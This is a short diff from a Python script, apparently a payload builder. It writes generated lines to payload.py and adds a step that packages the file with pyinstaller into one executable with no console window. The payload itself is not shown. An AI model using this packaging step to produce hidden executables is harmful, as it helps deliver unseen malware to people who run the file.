@@ -44,3 +44,7 @@ for count in range(0, len(arrPayload)):
 payloadFile = open('payload.py', 'w')
 payloadFile.writelines(arrPayload)
 payloadFile.close()
+
+# creating an executable
+
+os.system('pyinstaller payload.py --onefile --noconsole')
